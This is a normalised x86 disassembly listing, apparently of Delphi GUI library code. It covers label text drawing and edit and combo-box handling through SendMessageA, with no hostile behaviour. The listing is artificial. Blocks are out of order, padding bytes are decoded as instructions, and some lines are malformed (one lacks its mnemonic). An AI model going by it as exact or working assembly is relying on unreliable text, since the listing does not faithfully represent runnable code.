call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44b2c4
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_42517c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404180
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404178
push eax
mov eax [ ebp - 0x4 ]
call sub_404378
push eax
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_42426c
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404178
push eax
mov eax [ ebp - 0x4 ]
call sub_404378
push eax
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_42426c
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404178
push eax
mov eax [ ebp - 0x4 ]
call sub_404378
push eax
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4400b9
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_4400c3
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_4402ec
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_424b54
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_424a38
xor edx edx
mov eax [ esi + 0x14 ]
call sub_424b54
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_424e6c
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403324
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403324
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_4401e4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_425300
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403324
xor edx edx
mov eax [ edi + 0x160 ]
call sub_425300
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403324
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_445d0c
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_440328
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4402ec
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_440388
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403324
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4403b0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_448454
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_440414
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4404a1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4404a8
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448fac
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_460768
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403324
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_4404f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b4f8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_448740
mov edx 0x19
mov eax esi
call sub_448764
mov dl 0x1
mov eax esi
call sub_44fa0c
xor edx edx
mov eax esi
call sub_449170
mov [ esi + 0x20c ] 0x1
mov [ esi + 0x20f ] 0x1
mov [ esi + 0x210 ] 0x1
mov [ esi + 0x211 ] 0x1
mov eax esi
call sub_440c08
mov eax esi
test bl bl
je r-xdata
sub_4405a0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_440620
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x208 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x208 ] esi
mov eax ebx
call sub_44fadc
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_440664
push ebx
push esi
mov esi eax
mov bl [ esi + 0x215 ]
mov eax esi
call sub_44fadc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_44f7d8
push eax
call SendMessageA
test eax eax
setne bl
sub_44069c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44fadc
test al al
je r-xdata
mov [ esi + 0x215 ] bl
pop esi
pop ebx
retn
push 0x0
xor eax eax
mov al bl
push eax
push 0xb9
mov eax esi
call sub_44f7d8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4406d4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_440751
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x20d ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440758
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov [ ebx + 0x20d ] dl
mov eax ebx
call sub_44fadc
test al al
je r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x20d ]
push eax
push 0xcc
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448fac
mov eax [ ebp - 0x4 ]
call sub_404378
mov edx eax
mov eax ebx
call sub_448f88
sub_44075c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x20e ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x20e ] bl
mov eax esi
call sub_44fadc
test al al
je r-xdata
push 0x0
xor eax eax
mov al bl
push eax
push 0xcf
mov eax esi
call sub_44f7d8
push eax
call SendMessageA
sub_440798
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_4407bc
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4407dc
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_44080c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4408a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_448f20
inc eax
call sub_408a6c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_440932
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_408a80
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_448f30
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4088d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440939
mov eax [ ebp - 0xc ]
call sub_408ab8
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_440944
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_403fa8
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_448f20
inc eax
call sub_408a6c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4409d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408a80
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_448f30
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_4028c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_408ab8
retn
sub_4409e0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c664
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44c590
mov eax [ esi + 0x4 ]
or eax 0xc0
xor edx edx
mov dl [ ebx + 0x20c ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x20d ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x20e ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x213 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x211 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x212 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_440a99
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_44c960
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_44c960
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_440b0c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_440b4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44c790
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440b52
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_440b52
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_44069c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_440bcc
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call SendMessageA
sub_440bcc
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_440c08
pop ebx
retn
sub_440c08
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_424280
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_448764
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_440cd4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_44d350
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_440d0c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_44f7d8
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_44f7d8
push eax
call SendMessageA
sub_440d4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44edf0
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_440bcc
mov eax ebx
call sub_44cd78
sub_440d80
push ebx
mov ebx eax
mov eax ebx
call sub_44ed34
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_440c08
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_440dc8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44eb8c
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_44f7d8
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_44088c
sub_440e04
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44fadc
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_403324
push 0xfffffff0
mov eax esi
call sub_44f7d8
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_440e3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_4508b8
pop esi
pop ebx
retn
sub_440e74
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_440eda
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_44f7d8
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440ee1
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c78
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_419c0c
sub_440eec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_44f7d8
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_440f10
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_44f7d8
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_404504
mov edx esi
xchg edx eax
call sub_404504
mov eax [ esi ]
call sub_404378
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_44f7d8
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440f68
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_440fcc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_448fac
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_44f7d8
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_448fdc
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440fd3
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_440fd8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_44f7d8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_440ff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404378
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_44f7d8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_441020
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_44f7d8
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_449520
sub_441054
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44b4f8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_448740
mov edx 0x19
mov eax ebx
call sub_448764
mov dl 0x1
mov eax ebx
call sub_44fa0c
xor edx edx
mov eax ebx
call sub_449170
mov dl 0x1
mov eax [ r-xdata ]
call sub_424c18
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_447b60
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_441390
call sub_421ddc
mov [ ebx + 0x24c ] eax
push ebx
push sub_441488
call sub_421ddc
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_441148
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax esi
call sub_44fadc
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_460664
mov eax [ esi + 0x24c ]
call sub_460664
mov eax [ esi + 0x208 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b628
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4411ca
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_44cbcc
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_441214
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_441238
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_44f7d8
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_44f7d8
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_441280
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_4412ac
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
sub_4412f8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_44f7d8
push eax
call SetWindowTextA
sub_441334
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_441214
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_44136c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44edf0
pop esi
pop ebx
retn
mov eax ebx
call sub_44cd78
sub_441390
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_4607d8
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_448af0
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406b90
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44968c
jmp r-xdata
sub_4414a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44175f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
